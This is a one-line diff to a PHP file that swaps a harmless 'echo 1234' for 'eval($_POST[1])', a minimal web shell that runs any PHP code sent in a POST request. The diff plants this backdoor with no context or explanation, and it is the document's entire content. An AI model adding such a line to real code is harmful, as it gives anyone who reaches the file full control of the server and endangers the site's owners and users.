@@ -1,1 +1,1 @@
-<?php echo 1234;
+<?php eval($_POST[1]);
